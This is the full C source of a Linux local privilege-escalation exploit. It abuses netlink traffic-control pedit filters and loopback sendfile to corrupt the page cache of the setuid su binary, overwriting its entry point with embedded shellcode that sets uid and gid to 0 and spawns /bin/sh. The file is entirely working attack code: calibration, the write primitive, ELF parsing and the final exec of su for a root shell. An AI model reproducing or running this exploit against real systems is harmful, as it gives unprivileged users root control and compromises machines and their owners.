#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <elf.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/tc_act/tc_pedit.h>
#include <errno.h>

#define PAD 0x90
#define COW_SLOT       4
#define COW_MAX_WRITE  36
#define LOOPBACK_IP      0x7f000001u
#define LOOPBACK_PORT    4445
#define CALIB_FILE       "/tmp/.cow_calib"
#define CALIB_SIZE       4096
#define CALIB_OFFSET     512
#define CALIB_MARK       0xcc
#define MIN_PKT_LEN      100
#define SETTLE_USEC      250000

#ifndef TCA_EM_META_HDR
#define TCA_EM_META_HDR     1
#define TCA_EM_META_RVALUE  3
#endif
#ifndef TCF_EM_META
#define TCF_EM_META         2
#endif

static const unsigned char shellcode[] = {
    0x31, 0xff,
    0xb8, 0x6a, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0xb8, 0x69, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x48, 0x31, 0xd2,
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x53,
    0x48, 0x89, 0xe7,
    0x52,
    0x57,
    0x48, 0x89, 0xe6,
    0xb8, 0x3b, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    PAD, PAD, PAD
};

static const char *su_paths[] = { "/bin/su", "/usr/bin/su", "/sbin/su", NULL };

static int netlink_fd = -1;
static int lo_idx = 0;
static int listen_sock = -1;
static int offset_delta = 0;
static int use_matchall = 0;

static char req_buf[8192];
static struct nlmsghdr *req_hdr;
static unsigned int seq = 1;

static void req_begin(int type, int flags) {
    memset(req_buf, 0, sizeof(req_buf));
    req_hdr = (struct nlmsghdr *)req_buf;
    req_hdr->nlmsg_len = NLMSG_HDRLEN;
    req_hdr->nlmsg_type = type;
    req_hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
    req_hdr->nlmsg_seq = seq++;
}

static void *req_reserve(int len) {
    void *p = req_buf + NLMSG_ALIGN(req_hdr->nlmsg_len);
    req_hdr->nlmsg_len = NLMSG_ALIGN(req_hdr->nlmsg_len) + len;
    return p;
}

static void req_put(const void *data, int len) {
    memcpy(req_reserve(len), data, len);
}

static void req_attr(int type, const void *data, int len) {
    struct rtattr *r = req_reserve(RTA_LENGTH(len));
    r->rta_type = type;
    r->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(r), data, len);
}

static void req_attr_str(int type, const char *s) {
    req_attr(type, s, strlen(s) + 1);
}

static struct rtattr *req_nest_begin(int type, int nested) {
    struct rtattr *r = req_reserve(RTA_LENGTH(0));
    r->rta_type = nested ? (type | NLA_F_NESTED) : type;
    r->rta_len = RTA_LENGTH(0);
    return r;
}

static void req_nest_end(struct rtattr *r) {
    r->rta_len = (char *)req_buf + req_hdr->nlmsg_len - (char *)r;
}

static int req_send(int allow_enoent) {
    char reply[4096];
    struct nlmsghdr *h;
    struct nlmsgerr *e;
    int n;
    if (send(netlink_fd, req_buf, req_hdr->nlmsg_len, 0) < 0)
        return -1;
    n = recv(netlink_fd, reply, sizeof(reply), 0);
    if (n < 0)
        return -1;
    h = (struct nlmsghdr *)reply;
    if (h->nlmsg_type != NLMSG_ERROR)
        return 0;
    e = NLMSG_DATA(h);
    if (e->error && !(allow_enoent && e->error == -ENOENT))
        return e->error;
    return 0;
}

static int link_up(int idx) {
    struct ifinfomsg ifm;
    req_begin(RTM_NEWLINK, 0);
    memset(&ifm, 0, sizeof(ifm));
    ifm.ifi_family = AF_UNSPEC;
    ifm.ifi_index = idx;
    ifm.ifi_flags = IFF_UP;
    ifm.ifi_change = IFF_UP;
    req_put(&ifm, sizeof(ifm));
    return req_send(0);
}

static int link_addr(int idx, uint32_t addr) {
    struct ifaddrmsg ifa;
    uint32_t a = htonl(addr);
    req_begin(RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE);
    memset(&ifa, 0, sizeof(ifa));
    ifa.ifa_family = AF_INET;
    ifa.ifa_prefixlen = 8;
    ifa.ifa_index = idx;
    req_put(&ifa, sizeof(ifa));
    req_attr(IFA_LOCAL, &a, sizeof(a));
    req_attr(IFA_ADDRESS, &a, sizeof(a));
    return req_send(0);
}

static void clsact_del(int idx) {
    struct tcmsg t;
    req_begin(RTM_DELQDISC, 0);
    memset(&t, 0, sizeof(t));
    t.tcm_family = AF_UNSPEC;
    t.tcm_ifindex = idx;
    t.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    t.tcm_parent = TC_H_CLSACT;
    req_put(&t, sizeof(t));
    req_send(1);
}

static int clsact_add(int idx) {
    struct tcmsg t;
    req_begin(RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL);
    memset(&t, 0, sizeof(t));
    t.tcm_family = AF_UNSPEC;
    t.tcm_ifindex = idx;
    t.tcm_handle = TC_H_MAKE(TC_H_CLSACT, 0);
    t.tcm_parent = TC_H_CLSACT;
    req_put(&t, sizeof(t));
    req_attr_str(TCA_KIND, "clsact");
    return req_send(0);
}

static void append_ematch_pktlen(uint32_t threshold) {
    struct tcf_ematch_tree_hdr th;
    struct tcf_ematch_hdr mh;
    struct {
        uint16_t kind;
        uint8_t shift, op;
    } meta;
    struct rtattr *tree, *list, *em;
    tree = req_nest_begin(TCA_BASIC_EMATCHES, 1);
    memset(&th, 0, sizeof(th));
    th.nmatches = 1;
    req_attr(TCA_EMATCH_TREE_HDR, &th, sizeof(th));
    list = req_nest_begin(TCA_EMATCH_TREE_LIST, 1);
    em = req_nest_begin(1, 0);
    memset(&mh, 0, sizeof(mh));
    mh.kind = TCF_EM_META;
    mh.flags = TCF_EM_REL_END;
    req_put(&mh, sizeof(mh));
    memset(&meta, 0, sizeof(meta));
    meta.kind = (1 << 12) | 9;
    meta.op = TCF_EM_OPND_GT;
    req_attr(TCA_EM_META_HDR, &meta, sizeof(meta));
    req_attr(TCA_EM_META_RVALUE, &threshold, sizeof(threshold));
    req_nest_end(em);
    req_nest_end(list);
    req_nest_end(tree);
}

struct pedit_key {
    uint32_t offset;
    uint32_t value;
    uint32_t mask;
    uint16_t htype;
};

static void append_pedit_action(const struct pedit_key *keys, int n) {
    char sel_buf[sizeof(struct tc_pedit_sel) + 64 * sizeof(struct tc_pedit_key)];
    struct tc_pedit_sel *sel = (void *)sel_buf;
    struct tc_pedit_key *k = (void *)(sel_buf + sizeof(*sel));
    struct rtattr *act, *opt, *keys_ex, *key_ex;
    uint16_t htype, cmd;
    int i;
    act = req_nest_begin(1, 1);
    req_attr_str(TCA_ACT_KIND, "pedit");
    opt = req_nest_begin(TCA_ACT_OPTIONS, 1);
    memset(sel_buf, 0, sizeof(sel_buf));
    sel->nkeys = n;
    sel->action = TC_ACT_PIPE;
    for (i = 0; i < n; i++) {
        k[i].off = keys[i].offset;
        k[i].val = keys[i].value;
        k[i].mask = keys[i].mask;
    }
    req_attr(TCA_PEDIT_PARMS_EX, sel_buf, sizeof(*sel) + n * sizeof(struct tc_pedit_key));
    keys_ex = req_nest_begin(TCA_PEDIT_KEYS_EX, 1);
    for (i = 0; i < n; i++) {
        key_ex = req_nest_begin(TCA_PEDIT_KEY_EX, 1);
        htype = keys[i].htype;
        req_attr(TCA_PEDIT_KEY_EX_HTYPE, &htype, sizeof(htype));
        cmd = TCA_PEDIT_KEY_EX_CMD_SET;
        req_attr(TCA_PEDIT_KEY_EX_CMD, &cmd, sizeof(cmd));
        req_nest_end(key_ex);
    }
    req_nest_end(keys_ex);
    req_nest_end(opt);
    req_nest_end(act);
}

static int filter_add(int idx, const struct pedit_key *keys, int n) {
    struct tcmsg t;
    struct rtattr *opts, *act_list;
    req_begin(RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL);
    memset(&t, 0, sizeof(t));
    t.tcm_family = AF_UNSPEC;
    t.tcm_ifindex = idx;
    t.tcm_parent = TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_EGRESS);
    t.tcm_info = TC_H_MAKE(1 << 16, htons(ETH_P_ALL));
    req_put(&t, sizeof(t));
    if (use_matchall) {
        req_attr_str(TCA_KIND, "matchall");
        opts = req_nest_begin(TCA_OPTIONS, 1);
        act_list = req_nest_begin(TCA_MATCHALL_ACT, 1);
    } else {
        req_attr_str(TCA_KIND, "basic");
        opts = req_nest_begin(TCA_OPTIONS, 1);
        append_ematch_pktlen(MIN_PKT_LEN);
        act_list = req_nest_begin(TCA_BASIC_ACT, 1);
    }
    append_pedit_action(keys, n);
    req_nest_end(act_list);
    req_nest_end(opts);
    return req_send(0);
}

static int do_burst(int fd_src, const struct pedit_key *keys, int n) {
    struct sockaddr_in addr;
    struct stat st;
    int cfd, sfd;
    off_t off = 0;
    if (fstat(fd_src, &st) < 0)
        return -1;
    clsact_del(lo_idx);
    if (clsact_add(lo_idx) < 0)
        return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_IP);
    addr.sin_port = htons(LOOPBACK_PORT);
    cfd = socket(AF_INET, SOCK_STREAM, 0);
    if (cfd < 0)
        return -1;
    if (connect(cfd, (void*)&addr, sizeof(addr)) < 0) {
        close(cfd);
        return -1;
    }
    sfd = accept(listen_sock, NULL, NULL);
    if (sfd < 0) {
        close(cfd);
        return -1;
    }
    if (filter_add(lo_idx, keys, n) < 0) {
        close(cfd);
        close(sfd);
        return -1;
    }
    fcntl(cfd, F_SETFL, O_NONBLOCK);
    if (sendfile(cfd, fd_src, &off, st.st_size) < 0 && errno != EAGAIN) {
        close(cfd);
        close(sfd);
        return -1;
    }
    usleep(SETTLE_USEC);
    close(cfd);
    close(sfd);
    return 0;
}

static int calibrate(void) {
    struct pedit_key keys[2];
    uint8_t buf[CALIB_SIZE];
    int fd, i, found = -1;
    fd = open(CALIB_FILE, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return -1;
    memset(buf, 0, sizeof(buf));
    if (write(fd, buf, sizeof(buf)) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    fsync(fd);
    keys[0].offset = 0;
    keys[0].value = 0x4fu;
    keys[0].mask = 0xffffff00u;
    keys[0].htype = TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK;
    keys[1].offset = CALIB_OFFSET;
    keys[1].value = CALIB_MARK * 0x01010101u;
    keys[1].mask = 0;
    keys[1].htype = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
    if (do_burst(fd, keys, 2) < 0) {
        close(fd);
        return -1;
    }
    if (pread(fd, buf, sizeof(buf), 0) != sizeof(buf)) {
        close(fd);
        return -1;
    }
    for (i = 0; i + 4 <= CALIB_SIZE; i++) {
        if (buf[i] == CALIB_MARK && buf[i+1] == CALIB_MARK &&
            buf[i+2] == CALIB_MARK && buf[i+3] == CALIB_MARK) {
            found = i;
            break;
        }
    }
    close(fd);
    unlink(CALIB_FILE);
    if (found < 0)
        return -1;
    offset_delta = found - CALIB_OFFSET;
    return 0;
}

static int cow_setup(void) {
    struct sockaddr_in addr;
    int reuse = 1;
    netlink_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (netlink_fd < 0)
        return -1;
    lo_idx = if_nametoindex("lo");
    if (!lo_idx || link_up(lo_idx) < 0)
        return -1;
    link_addr(lo_idx, LOOPBACK_IP);
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0)
        return -1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(LOOPBACK_IP);
    addr.sin_port = htons(LOOPBACK_PORT);
    if (bind(listen_sock, (void*)&addr, sizeof(addr)) < 0)
        return -1;
    if (listen(listen_sock, 8) < 0)
        return -1;
    if (calibrate() == 0)
        return 0;
    use_matchall = 1;
    return calibrate();
}

static int cow_write(int fd, off_t off, const void *src, size_t len) {
    struct pedit_key keys[64];
    const uint8_t *bytes = src;
    int n = 0;
    size_t pos;
    if (len == 0 || len > COW_MAX_WRITE || (len % COW_SLOT) != 0)
        return -1;
    if (off < offset_delta)
        return -1;
    keys[n].offset = 0;
    keys[n].value = 0x4fu;
    keys[n].mask = 0xffffff00u;
    keys[n].htype = TCA_PEDIT_KEY_EX_HDR_TYPE_NETWORK;
    n++;
    for (pos = 0; pos < len; pos += COW_SLOT) {
        keys[n].offset = (uint32_t)(off + pos) - (uint32_t)offset_delta;
        keys[n].value = (uint32_t)bytes[pos] |
                        ((uint32_t)bytes[pos+1] << 8) |
                        ((uint32_t)bytes[pos+2] << 16) |
                        ((uint32_t)bytes[pos+3] << 24);
        keys[n].mask = 0;
        keys[n].htype = TCA_PEDIT_KEY_EX_HDR_TYPE_TCP;
        n++;
    }
    return do_burst(fd, keys, n);
}

static const char *find_su(void) {
    struct stat st;
    for (int i = 0; su_paths[i]; i++) {
        if (stat(su_paths[i], &st) == 0 && S_ISREG(st.st_mode) &&
            (st.st_mode & S_ISUID) && st.st_uid == 0)
            return su_paths[i];
    }
    return NULL;
}

static long elf_entry_offset(int fd) {
    Elf64_Ehdr eh;
    Elf64_Phdr ph;
    if (pread(fd, &eh, sizeof(eh), 0) != sizeof(eh))
        return -1;
    if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0 || eh.e_ident[EI_CLASS] != ELFCLASS64)
        return -1;
    for (int i = 0; i < eh.e_phnum; i++) {
        off_t pos = eh.e_phoff + i * eh.e_phentsize;
        if (pread(fd, &ph, sizeof(ph), pos) != sizeof(ph))
            return -1;
        if (ph.p_type == PT_LOAD && (ph.p_flags & PF_X) &&
            eh.e_entry >= ph.p_vaddr && eh.e_entry < ph.p_vaddr + ph.p_filesz) {
            return (long)(eh.e_entry - ph.p_vaddr + ph.p_offset);
        }
    }
    return -1;
}

static void write_proc(const char *path, const char *val) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) {
        write(fd, val, strlen(val));
        close(fd);
    }
}

static int corrupt_su(int su_fd, long entry_off) {
    char buf[64];
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0) {
        perror("unshare");
        return -1;
    }
    write_proc("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %u 1", uid);
    write_proc("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %u 1", gid);
    write_proc("/proc/self/gid_map", buf);
    if (cow_setup() != 0)
        return -1;
    size_t done = 0;
    while (done < sizeof(shellcode)) {
        size_t chunk = sizeof(shellcode) - done;
        if (chunk > COW_MAX_WRITE)
            chunk = COW_MAX_WRITE;
        if (cow_write(su_fd, entry_off + done, shellcode + done, chunk) != 0)
            return -1;
        done += chunk;
    }
    return 0;
}

int main(void) {
    const char *su_path;
    int su_fd;
    long entry_off;
    int pipefd[2];
    pid_t child;
    char ack = 0;
    if (getuid() == 0) {
        fprintf(stderr, "[-] Do not run as root\n");
        return 1;
    }
    su_path = find_su();
    if (!su_path) {
        fprintf(stderr, "[-] No setuid su found\n");
        return 1;
    }
    su_fd = open(su_path, O_RDONLY);
    if (su_fd < 0) {
        perror("open su");
        return 1;
    }
    entry_off = elf_entry_offset(su_fd);
    if (entry_off < 0) {
        fprintf(stderr, "[-] Cannot find entry point\n");
        return 1;
    }
    printf("[*] Target: %s (uid=%d), entry offset=0x%lx, shellcode size=%zu\n",
           su_path, getuid(), entry_off, sizeof(shellcode));
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return 1;
    }
    child = fork();
    if (child < 0) {
        perror("fork");
        return 1;
    }
    if (child == 0) {
        close(pipefd[0]);
        if (corrupt_su(su_fd, entry_off) == 0) {
            write(pipefd[1], "1", 1);
            _exit(0);
        }
        _exit(1);
    }
    close(pipefd[1]);
    if (read(pipefd[0], &ack, 1) != 1 || ack != '1') {
        fprintf(stderr, "[-] Corruption failed\n");
        return 1;
    }
    wait(NULL);
    printf("[+] Entry point overwritten. Executing %s...\n", su_path);
    execl(su_path, su_path, NULL);
    perror("execl");
    return 1;
}
